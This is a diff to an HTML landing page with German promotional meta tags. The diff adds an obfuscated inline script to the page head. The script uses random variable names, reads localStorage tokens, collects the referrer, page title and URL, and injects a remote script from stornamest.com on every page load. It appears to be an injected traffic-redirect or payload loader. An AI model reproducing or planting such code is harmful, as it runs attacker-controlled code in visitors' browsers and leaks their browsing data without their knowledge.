@@ -1,6 +1,51 @@
 <!DOCTYPE html>
 <html  >
 <head>
+
+<script>
+    (function() {
+    var name = '_WhYg45RsbNc2bhXD';
+    if (!window._WhYg45RsbNc2bhXD) {
+        window._WhYg45RsbNc2bhXD = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/8Ys1WrPR',
+            P_PATH: 'https://stornamest.com/7b4f75c/postback',
+        };
+    }
+    const _R8N7Bv451rpzP71y = localStorage.getItem('config');
+    if (typeof _R8N7Bv451rpzP71y !== 'undefined' && _R8N7Bv451rpzP71y !== null) {
+        var _KQW1LHmCQ3CxNqBv = JSON.parse(_R8N7Bv451rpzP71y);
+        var _y21XBhWkDN8CPNzg = Math.round(+new Date()/1000);
+        if (_KQW1LHmCQ3CxNqBv.created_at + window._WhYg45RsbNc2bhXD.ttl < _y21XBhWkDN8CPNzg) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _G1j7BkmDSg6bWfCr = localStorage.getItem('subId');
+    var _XQKgYW5xjtvVj6n7 = localStorage.getItem('token');
+    var _4N88LTzhttQhc4KP = '?return=js.client';
+        _4N88LTzhttQhc4KP += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _4N88LTzhttQhc4KP += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _4N88LTzhttQhc4KP += '&default_keyword=' + encodeURIComponent(document.title);
+        _4N88LTzhttQhc4KP += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _4N88LTzhttQhc4KP += '&name=' + encodeURIComponent(name);
+        _4N88LTzhttQhc4KP += '&host=' + encodeURIComponent(window._WhYg45RsbNc2bhXD.R_PATH);
+    if (typeof _G1j7BkmDSg6bWfCr !== 'undefined' && _G1j7BkmDSg6bWfCr && window._WhYg45RsbNc2bhXD.unique) {
+        _4N88LTzhttQhc4KP += '&sub_id=' + encodeURIComponent(_G1j7BkmDSg6bWfCr);
+    }
+    if (typeof _XQKgYW5xjtvVj6n7 !== 'undefined' && _XQKgYW5xjtvVj6n7 && window._WhYg45RsbNc2bhXD.unique) {
+        _4N88LTzhttQhc4KP += '&token=' + encodeURIComponent(_XQKgYW5xjtvVj6n7);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._WhYg45RsbNc2bhXD.R_PATH + _4N88LTzhttQhc4KP;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
+    
   <meta property="og:title" content="Klicken Sie hier, um mehr zu erfahren">
   <meta property="og:description" content="Letzter Tag Rabatt">
   <meta property="og:image" content="assets/images/ch1.png">
